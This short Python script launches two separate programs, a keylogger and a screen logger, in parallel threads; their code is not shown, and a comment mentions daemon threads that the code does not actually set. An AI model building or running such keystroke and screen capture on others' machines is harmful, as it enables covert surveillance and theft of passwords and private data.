import os
import threading
import subprocess

def start_screenlogger():
    os.system("python screenloggerV2.0.py")

def start_keylogger():
    os.system("python keyloggerV2.0.py")

# Create daemon threads so they exit when the main program ends
threadScreenlogger = threading.Thread(target=start_screenlogger)
threadKeylogger = threading.Thread(target=start_keylogger)

threadScreenlogger.start()
threadKeylogger.start()

threadScreenlogger.join()
threadKeylogger.join()

